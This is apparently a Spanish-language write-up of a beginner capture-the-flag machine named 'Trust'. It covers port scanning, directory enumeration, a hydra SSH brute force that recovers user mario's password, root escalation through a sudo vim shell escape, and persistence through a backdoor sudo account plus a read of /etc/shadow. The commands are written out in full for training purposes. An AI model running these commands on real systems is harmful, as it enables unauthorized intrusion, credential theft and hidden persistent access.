
![](img/Pasted%20image%2020241207191507.png#center)


Este writeup documenta la explotación de la máquina **Trust**, clasificada como de nivel muy fácil. Aunque sencilla, los creadores suelen incluir pequeños trucos para hacerla más interesante. ¡Vamos a ello!

---

## Reconocimiento inicial



Primero verificamos la conectividad de la máquina con un **ping**, observando un **TTL de 64**, lo que indica que el sistema objetivo utiliza **Linux**.

![](img/Pasted%20image%2020241207191758.png#center)

---

## Enumeración


#### Escaneo de puertos


Realizamos un escaneo de puertos con **nmap** para identificar los que están abiertos:
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.18.0.2
```

![](img/Pasted%20image%2020241207191855.png#center)




Encontramos los puertos **22** (SSH) y **80** (HTTP) abiertos. Luego, profundizamos con un escaneo más exhaustivo:
```
nmap -p 22,80 -sVC --min-rate 5000 -n -Pn 172.18.0.2
```

![](img/Pasted%20image%2020241207192244.png#center)

El puerto **80** está asociado a un servidor web Apache, lo que podría ser vulnerable. Vamos a inspeccionarlo.

---

### Análisis del servidor web


Al acceder al servidor web y revisar el código fuente, no encontramos nada relevante.
![](img/Pasted%20image%2020241207215350.png)




Para explorar más, usamos **gobuster** en busca de directorios y archivos:
```
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,cgi,txt
```
![](img/Pasted%20image%2020241207220031.png)

Gobuster encuentra el archivo **secret.php**, que inspeccionamos. El archivo muestra un mensaje indicando que la web no puede ser hackeada y menciona un posible usuario: **mario**.
![](img/Pasted%20image%2020241207220242.png)

---

## Explotación



Con el puerto **22** abierto y el usuario **mario**, intentamos una fuerza bruta al protocolo **SSH** usando **hydra**:
```
hydra -l mario -P /usr/share//wordlists/rockyou.txt ssh://172.18.0.2
```
![](img/Pasted%20image%2020241207220630.png#center)

Obtenemos las credenciales:

- **Usuario:** mario
- **Contraseña:** chocolate



Probamos las credenciales con **ssh**:
```
ssh mario@172.18.0.2
```
![](img/Pasted%20image%2020241207220749.png#center)

Accedemos con éxito a la máquina.

---

## Post-explotación



Verificamos el usuario con el que hemos ingresado:
```
whoami
```
![](img/Pasted%20image%2020241207220931.png#center)




#### Escalada de privilegios

Comprobamos si podemos ejecutar comandos como **root** con **sudo**:
```
sudo -l
```
![](img/Pasted%20image%2020241207221056.png#center)

El binario **/usr/bin/vim** puede ejecutarse como root. Con la ayuda de la web **GTFObins**, podemos escalar privilegios ejecutando:
```
sudo /usr/bin/vim
```

Dentro de vim, usamos el comando `:!/bin/sh` para obtener una shell como root.
![](img/Pasted%20image%2020241207221412.png#center)




Ejecutamos el programa
```
sudo /usr/bin/vim
```
![](img/Pasted%20image%2020241207221709.png)



Una vez dentro tenemos que teclear `:!/bin/sh`
![](img/Pasted%20image%2020241207221827.png)


Al darle `ENTER`, recibimos el siguiente `prompt`
![](img/Pasted%20image%2020241207221916.png)


Comprobamos que usuario somos, si hemos escalado privilegios

![](img/Pasted%20image%2020241207221952.png#center)


Somo el usuario `root`. Para tener mas comodidad vamos a obtener una shell mas completa
```
/bin/bash -i
```

![](img/Pasted%20image%2020241207222056.png#center)


---

### Persistencia

Para mantener el acceso, creamos un nuevo usuario llamado **jonay** y lo añadimos al grupo **sudo**:

1. Crear usuario y asignar contraseña: 
```
useradd -m -s /bin/bash jonay
passwd jonay
```

![](img/Pasted%20image%2020241207222512.png#center)
   
    
2. Añadirlo al grupo **sudo**:
```
usermod -aG sudo jonay 
```

![](img/Pasted%20image%2020241207222555.png#center)
		
3. Verificar la creación:
```
cat /etc/shadow
```

![](img/Pasted%20image%2020241207222708.png#center)
    

Probamos el acceso con **ssh**:
```
ssh jonay@172.18.0.2
```
![](img/Pasted%20image%2020241207222834.png#center)

Verificamos si podemos escalar privilegios. Según **sudo -l**, podemos ejecutar cualquier binario como root. Probamos con:
```
sudo -l
```
![](img/Pasted%20image%2020241207222953.png)

Gracias a esta configuración, tenemos acceso persistente con privilegios de root.

---

## Conclusión

La máquina **Trust** nos permitió practicar:

1. Reconocimiento con herramientas como **nmap** y **gobuster**.
2. Fuerza bruta con **hydra**.
3. Escalada de privilegios utilizando **vim** y **GTFObins**.
4. Configuración de persistencia creando un nuevo usuario con acceso privilegiado.

